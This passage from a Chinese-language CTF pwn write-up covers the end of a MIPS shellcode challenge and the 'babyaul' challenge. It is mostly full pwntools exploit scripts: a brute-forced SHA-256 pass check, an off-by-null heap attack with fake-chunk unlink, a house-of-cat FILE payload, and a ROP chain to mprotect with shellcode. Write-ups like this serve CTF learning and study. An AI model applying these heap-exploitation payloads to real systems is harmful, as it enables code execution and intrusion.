class="hljs-number">11</span>, <span class="hljs-number">19</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <br>        <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">25</span>, <span class="hljs-number">14</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">33</span>, <span class="hljs-number">4</span>, <br>        <span class="hljs-number">17</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">29</span>, <span class="hljs-number">33</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">41</span>, <span class="hljs-number">44</span>, <span class="hljs-number">3</span>, <br>        <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">46</span>, <span class="hljs-number">29</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">47</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">53</span>, <span class="hljs-number">5</span>, <br>        <span class="hljs-number">43</span>, <span class="hljs-number">52</span>, <span class="hljs-number">29</span>, <span class="hljs-number">32</span>, <span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">41</span>, <span class="hljs-number">60</span>, <br>        <span class="hljs-number">33</span>, <span class="hljs-number">26</span>, <span class="hljs-number">39</span>, <span class="hljs-number">1</span>, <span class="hljs-number">53</span>, <span class="hljs-number">52</span>, <span class="hljs-number">69</span>, <span class="hljs-number">29</span>, <span class="hljs-number">5</span>, <span class="hljs-number">74</span>, <br>        <span class="hljs-number">5</span>, <span class="hljs-number">29</span>, <span class="hljs-number">69</span>, <span class="hljs-number">44</span>, <span class="hljs-number">33</span>, <span class="hljs-number">36</span>, <span class="hljs-number">53</span>, <span class="hljs-number">84</span>, <span class="hljs-number">43</span>, <span class="hljs-number">14</span>, <br>        <span class="hljs-number">85</span>, <span class="hljs-number">81</span>, <span class="hljs-number">89</span>, <span class="hljs-number">18</span>, <span class="hljs-number">49</span>, <span class="hljs-number">92</span>, <span class="hljs-number">53</span>, <span class="hljs-number">24</span>, <span class="hljs-number">5</span>, <span class="hljs-number">93</span>, <br>        <span class="hljs-number">95</span>, <span class="hljs-number">8</span>]<br><br><span class="hljs-comment"># 29</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Go&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">payload</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, <span class="hljs-string">&#x27;29&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;Shellcode &gt;&#x27;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shop</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            menu(<span class="hljs-number">1</span>)<br>            p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, line.strip())<br><br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># p.recvuntil(b&#x27;Thief!&#x27;, timeout=0.2)</span><br>    temp = p.recvall(timeout=<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Thief!&#x27;</span> <span class="hljs-keyword">in</span> temp:<br>        log.success(<span class="hljs-string">&quot;thief: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br>            f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        exit(-<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># exploit()</span><br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> rand:<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(x))<br><br>shop(<span class="hljs-number">3</span>)<br>shop(<span class="hljs-number">2</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lw $a1, 56($sp)</span><br><span class="hljs-string">lw $a2, 56($sp)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(shellcode)<br><br>attack(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>至于随机数，笔者利用题目给的libc库总是失败。也没想到其他办法，笔者这里的思路是爆破。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">rm</span> rand.txt<br><span class="hljs-built_in">touch</span> rand.txt<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..100&#125;<br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">for</span>((j=<span class="hljs-number">1</span>; j&lt;=<span class="hljs-variable">$i</span>; j++))<br><span class="hljs-keyword">do</span><br>sudo python wp.py <span class="hljs-variable">$j</span><br><span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">break</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>将每次爆破的值存储到文件中，最后读取文件即可获取rand值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            menu(<span class="hljs-number">1</span>)<br>            p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, line.strip())<br><br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># p.recvuntil(b&#x27;Thief!&#x27;, timeout=0.2)</span><br>    temp = p.recvall(timeout=<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Thief!&#x27;</span> <span class="hljs-keyword">in</span> temp:<br>        log.success(<span class="hljs-string">&quot;thief: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br>            f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        exit(-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>爆了大概10分钟左右吧，就把所有的随机数都爆出来了。</p><h2 id="babyaul"><a href="#babyaul" class="headerlink" title="babyaul"></a>babyaul</h2><p>c语言与lua脚本的结合。</p><p>查看保护</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221358610.png" alt="image-20230711221358610"></p><p>我们的程序一开始是无法运行的，题目修改了lua脚本的文件头，我们复原文件头即可。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221532951.png" alt="image-20230711221532951"></p><p>即把Aul修改为Lua。</p><p>我们使用unlua反编译bins，得到lua脚本。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221744679.png" alt="image-20230711221744679"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221818483.png" alt="image-20230711221818483"></p><p>lua调用c语言pass对字符进行加密，通过后即为我们熟悉的菜单堆。</p><p>我们通过对babyaul进行逆向找到pass加密逻辑。</p><p>程序优先加载bins文件，这也就是我们一开始运行失败的主要原因。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222052515.png" alt="image-20230711222052515"></p><p>pass加密逻辑为随机输入4个一定范围的字符，然后进行sha256加密。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222334267.png" alt="image-20230711222334267"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222313455.png" alt="image-20230711222313455"></p><p>这里，我们直接进行爆破解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">str</span></span>):<br>    target_hash = data  <span class="hljs-comment"># 目标哈希值</span><br><br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):  <span class="hljs-comment"># 4 字节哈希共有 256^4 种组合</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                    <span class="hljs-comment"># 构造当前组合的字节串</span><br>                    attempt = <span class="hljs-built_in">bytes</span>([i, j, k, l])<br>                    <span class="hljs-comment"># 计算哈希值</span><br>                    hash_value = hashlib.sha256(attempt).digest().<span class="hljs-built_in">hex</span>()<br>                    <span class="hljs-keyword">if</span> hash_value == target_hash:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hash cracked! The original value is:&quot;</span>, attempt)<br>                        found = <span class="hljs-literal">True</span><br>                        <span class="hljs-keyword">return</span> attempt<br>                <span class="hljs-keyword">if</span> found:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> found:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to crack the hash.&quot;</span>)<br></code></pre></td></tr></table></figure><p>程序add存在off-by-null漏洞。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222609346.png" alt="image-20230711222609346"></p><p>这里我们可以泄露出堆地址，直接伪造fake_chunk通过unlink检查即可，就不需要布置过于复杂的堆风水了。利用直接使用house of cat一把嗦即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./babyaul&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index: <span class="hljs-built_in">str</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, index)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, mode=<span class="hljs-number">3</span>, content=<span class="hljs-string">&#x27;l1s00t&#x27;</span></span>):<br>    menu(<span class="hljs-string">&#x27;add&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;mode?&#x27;</span>, <span class="hljs-built_in">str</span>(mode))<br>    sleep(<span class="hljs-number">0.2</span>)<br>    p.send(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-string">&#x27;get&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-string">&#x27;del&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">str</span></span>):<br>    target_hash = data  <span class="hljs-comment"># 目标哈希值</span><br><br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):  <span class="hljs-comment"># 4 字节哈希共有 256^4 种组合</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                    <span class="hljs-comment"># 构造当前组合的字节串</span><br>                    attempt = <span class="hljs-built_in">bytes</span>([i, j, k, l])<br>                    <span class="hljs-comment"># 计算哈希值</span><br>                    hash_value = hashlib.sha256(attempt).digest().<span class="hljs-built_in">hex</span>()<br>                    <span class="hljs-keyword">if</span> hash_value == target_hash:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hash cracked! The original value is:&quot;</span>, attempt)<br>                        found = <span class="hljs-literal">True</span><br>                        <span class="hljs-keyword">return</span> attempt<br>                <span class="hljs-keyword">if</span> found:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> found:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to crack the hash.&quot;</span>)<br><br><br>shellcode = asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_cat</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    payload = flat(<br>        &#123;<br>            <span class="hljs-number">0x20</span>: [<br>                    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <br>                    <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                    fake_IO_file_addr+<span class="hljs-number">0x150</span>,    <span class="hljs-comment"># rdx</span><br>                    setcontext + <span class="hljs-number">61</span><br>                ],<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,    <span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,   <span class="hljs-comment"># _lock</span><br>            <span class="hljs-number">0x90</span>: fake_IO_file_addr + <span class="hljs-number">0x30</span>,  <span class="hljs-comment"># _IO_wide_data</span><br>            <span class="hljs-number">0xb0</span>: <span class="hljs-number">1</span>,    <span class="hljs-comment"># _mode</span><br>            <span class="hljs-number">0xc8</span>: _IO_wfile_jumps + <span class="hljs-number">0x30</span>,   <span class="hljs-comment"># fake_IO_wide_jumps</span><br>            <span class="hljs-number">0x100</span>: fake_IO_file_addr + <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0x140</span>: &#123;<br>                <span class="hljs-number">0xa0</span>: [fake_IO_file_addr + <span class="hljs-number">0x210</span>, ret]<br>            &#125;,<br>            <span class="hljs-number">0x200</span>: [<br>                pop_rdi_ret, fake_IO_file_addr &gt;&gt; <span class="hljs-number">12</span> &lt;&lt; <span class="hljs-number">12</span>,<br>                pop_rsi_ret, <span class="hljs-number">0x2000</span>,<br>                pop_rdx_rbx_ret, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>,<br>                pop_rax_ret, <span class="hljs-number">10</span>,    <span class="hljs-comment"># mprotect</span><br>                syscall_ret,<br>                fake_IO_file_addr+<span class="hljs-number">0x300</span>+<span class="hljs-number">0x10</span>,<br>            ],<br>            <span class="hljs-number">0x300</span>: shellcode,<br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">return</span> payload<br><br><br>menu(<span class="hljs-string">&#x27;pass&#x27;</span>)<br><br>enc = p.recvline()[:-<span class="hljs-number">1</span>].decode()<br>p.sendline(decrypt(enc))<br><br>add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 1</span><br><br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x520</span>)  <span class="hljs-comment"># 0</span><br><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">16</span>)      <span class="hljs-comment"># 2</span><br>show(<span class="hljs-number">2</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap_base)<br><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)     <span class="hljs-comment"># 2</span><br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>_IO_list_all = libc_base + <span class="hljs-number">0x1ed5a0</span><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1ee7f0</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x1e8f60</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x000000000015f8c6</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000630a9</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br><br>fake_chunk = heap_base + <span class="hljs-number">0xf70</span><br>fake_size = <span class="hljs-number">0x600</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x10</span>: [<span class="hljs-number">0</span>, fake_size, fake_chunk, fake_chunk],<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)   <span class="hljs-comment"># 3     no-use</span><br><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-number">3</span>, payload)  <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x4f8</span>)  <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)   <span class="hljs-comment"># 7</span><br><br>delete(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x108</span>, <span class="hljs-number">1</span>, flat(&#123;<span class="hljs-number">0x100</span>: fake_size&#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>))  <span class="hljs-comment"># 5 off-by-null</span><br><br>delete(<span class="hljs-number">6</span>)   <span class="hljs-comment"># trigger</span><br><br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: house_of_cat(fake_chunk),<br>        <span class="hljs-number">0x4e0</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x111</span>, p64(_IO_list_all)]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>add(<span class="hljs-number">0x520</span>, <span class="hljs-number">3</span>, payload)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>, p64(fake_chunk))<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-string">&#x27;exit&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222838284.png" alt="image-20230711222838284"></p><h2 id="three-boy"><a href="#three-boy" class="headerlink" 